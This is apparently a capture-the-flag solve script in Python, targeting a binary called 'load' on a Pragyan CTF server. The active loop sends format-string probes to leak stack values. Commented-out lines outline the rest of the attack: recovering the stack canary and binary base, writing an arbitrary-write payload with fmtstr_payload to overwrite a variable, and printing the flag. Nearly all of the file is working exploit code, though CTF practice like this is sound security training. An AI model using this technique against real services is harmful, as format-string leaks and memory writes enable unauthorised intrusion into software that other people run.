#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./load')
host = args.HOST or 'binary.challs.pragyanctf.tech'
port = int(args.PORT or 6003)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

def check(payload):
	sla(b"2) Upgrade Pack\n", b"1")
	sla(b"Wanna upgrade pack?\n", payload)

def upgrade(payload):
	sla(b"2) Upgrade Pack\n", b"2")
	sla(b"Enter coupon code:\n", payload)

libc=SetupLibcELF()
for i in range(100):
	# try:
		io=start()
		check(f"%{i}$p|")
		leak=rl().split(b"|")
		print(leak, i)
		# canary=int(leak[0],16)
		# exe.address=int(leak[1],16)-0x1020
		# info(f"CANARY := {hex(canary)}")
		# pb()
		# pay1=fmtstr_payload(offset=6, writes={exe.sym.b : 0xf9}, write_size='short')
		# check(pay1)
		# upgrade(f"%{i}$s")
		# rl()
		# print(f"FLAG {rl()}")
		io.close()
	# except:
		# pass
# io.interactive()